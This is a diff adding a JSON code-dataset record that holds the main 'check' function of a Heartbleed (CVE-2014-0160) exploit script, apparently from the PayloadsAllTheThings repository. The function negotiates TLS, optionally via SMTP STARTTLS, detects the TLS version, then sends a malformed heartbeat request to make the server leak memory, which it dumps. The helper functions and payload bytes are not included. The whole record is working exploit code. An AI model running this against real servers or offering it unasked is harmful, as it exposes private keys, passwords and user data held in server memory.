@@ -1,0 +1,7 @@
+{
+    "code": "def check(host, port, dumpf, quiet, starttls):\n\tresponse = False\n\tif starttls:\n\t\ttry:\n\t\t\ts = smtplib.SMTP(host=host,port=port)\n\t\t\ts.ehlo()\n\t\t\ts.starttls()\n\t\texcept smtplib.SMTPException:\n\t\t\tprint('STARTTLS not supported...')\n\t\t\ts.quit()\n\t\t\treturn False\n\t\tprint('STARTTLS supported...')\n\t\ts.quit()\n\t\ts = connect(host, port, quiet)\n\t\ts.settimeout(1)\n\t\ttry:\n\t\t\tre = s.recv(1024)\n\t\t\ts.send('ehlo starttlstest\\r\\n')\n\t\t\tre = s.recv(1024)\n\t\t\ts.send('starttls\\r\\n')\n\t\t\tre = s.recv(1024)\n\t\texcept socket.timeout:\n\t\t\tprint('Timeout issues, going ahead anyway, but it is probably broken ...')\n\t\ttls(s,quiet)\n\telse:\n\t\ts = connect(host, port, quiet)\n\t\ttls(s,quiet)\n\n\tversion = parseresp(s)\n\n\tif version == 0:\n\t\tif not quiet: print(\"Got an error while parsing the response, bailing ...\")\n\t\treturn False\n\telse:\n\t\tversion = version - 0x0300\n\t\tif not quiet: print(\"Server TLS version was 1.%d\\n\" % version)\n\n\tif not quiet: print('Sending heartbeat request...')\n\tsys.stdout.flush()\n\tif (version == 1):\n\t\ts.send(hbv10)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\tif (version == 2):\n\t\ts.send(hbv11)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\tif (version == 3):\n\t\ts.send(hbv12)\n\t\tresponse = hit_hb(s,dumpf, host, quiet)\n\ts.close()\n\treturn response",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Heartbleed CVE-2014-0160.py",
+    "license": "MIT",
+    "language": "python"
+}
